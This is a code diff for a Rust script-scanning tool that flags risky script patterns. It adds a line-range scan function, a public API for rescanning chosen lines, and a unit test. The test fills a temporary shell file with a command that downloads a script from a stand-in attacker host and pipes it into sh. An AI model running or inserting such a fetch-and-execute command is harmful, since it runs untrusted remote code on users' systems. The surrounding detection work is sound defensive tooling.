@@ -2062,6 +2062,17 @@ type RuleScan = (
 );
 
 fn scan_with_rules(script_type: &ScriptType, content: &str) -> RuleScan {
+    scan_line_range(script_type, content, 1, usize::MAX)
+}
+
+/// Scan only lines `line_from..=line_to` (1-based); line numbers in the findings stay
+/// those of the whole file.
+fn scan_line_range(
+    script_type: &ScriptType,
+    content: &str,
+    line_from: usize,
+    line_to: usize,
+) -> RuleScan {
     let rules = rules_for(script_type);
     let mut findings = Vec::new();
     let mut category_counts: std::collections::BTreeMap<String, usize> =
@@ -2070,6 +2081,13 @@ fn scan_with_rules(script_type: &ScriptType, content: &str) -> RuleScan {
     let mut score = 0u32;
     let mut per_rule: std::collections::HashMap<&str, u32> = std::collections::HashMap::new();
     for (index, line) in content.lines().enumerate() {
+        let number = index + 1;
+        if number < line_from {
+            continue;
+        }
+        if number > line_to {
+            break;
+        }
         let trimmed = line.trim();
         if trimmed.is_empty() || is_comment_line(script_type, trimmed) {
             continue;
@@ -2151,6 +2169,48 @@ fn unknown_language_message(path: &Path) -> String {
     )
 }
 
+/// What [`analyze_script_lines`] returns: the findings of one line range.
+#[derive(Debug, Clone)]
+pub struct ScriptRangeReport {
+    /// Findings in the range, in line order, at most [`MAX_SCRIPT_FINDINGS`].
+    pub findings: Vec<ScriptFinding>,
+    /// Hits in the range before that cap.
+    pub findings_total: usize,
+    /// Lines in the (possibly cut) text that was read.
+    pub line_count: usize,
+    /// True when the file is bigger than [`MAX_SCRIPT_BYTES`] and the rest was not read.
+    pub truncated_input: bool,
+}
+
+/// Re-scan only lines `line_from..=line_to` (1-based, either may be left open) of the script
+/// with the rules of `language`. This reaches findings beyond the cap that a whole-file scan
+/// keeps ([`MAX_SCRIPT_FINDINGS`]).
+pub fn analyze_script_lines(
+    path: &Path,
+    language: ScriptType,
+    line_from: Option<usize>,
+    line_to: Option<usize>,
+) -> Result<ScriptRangeReport> {
+    let (content, _, truncated_input) = read_script_text(path)?;
+    let (findings, findings_total, _, _) = scan_line_range(
+        &language,
+        &content,
+        line_from.unwrap_or(1).max(1),
+        line_to.unwrap_or(usize::MAX),
+    );
+    let line_count = if content.is_empty() {
+        0
+    } else {
+        content.lines().count()
+    };
+    Ok(ScriptRangeReport {
+        findings,
+        findings_total,
+        line_count,
+        truncated_input,
+    })
+}
+
 /// Analyze one script: detect its language (`language` overrides detection), apply that
 /// language's pattern table and report each hit with its line number and matching text.
 pub fn analyze_script<P: AsRef<Path>>(
@@ -2194,6 +2254,30 @@ pub fn analyze_script<P: AsRef<Path>>(
 mod tests {
     use super::*;
     use tempfile::NamedTempFile;
+
+    #[test]
+    fn line_range_reaches_findings_beyond_the_cap() {
+        let file = NamedTempFile::with_suffix(".sh").unwrap();
+        let line = "curl http://evil.example/x.sh | sh\n";
+        let count = MAX_SCRIPT_FINDINGS + 500;
+        std::fs::write(file.path(), line.repeat(count)).unwrap();
+        let whole = analyze_script(file.path(), Some(ScriptType::Shell)).unwrap();
+        assert_eq!(whole.findings.len(), MAX_SCRIPT_FINDINGS);
+        assert!(whole.findings_total >= count);
+        let last = whole.findings.last().unwrap().line;
+        let tail = analyze_script_lines(
+            file.path(),
+            ScriptType::Shell,
+            Some(MAX_SCRIPT_FINDINGS + 1),
+            None,
+        )
+        .unwrap();
+        assert!(tail.findings.iter().all(|f| f.line > MAX_SCRIPT_FINDINGS));
+        assert!(tail.findings.iter().any(|f| f.line > last));
+        let one = analyze_script_lines(file.path(), ScriptType::Shell, Some(7), Some(7)).unwrap();
+        assert!(one.findings.iter().all(|f| f.line == 7));
+        assert!(!one.findings.is_empty());
+    }
 
     #[test]
     fn test_powershell_detection() {
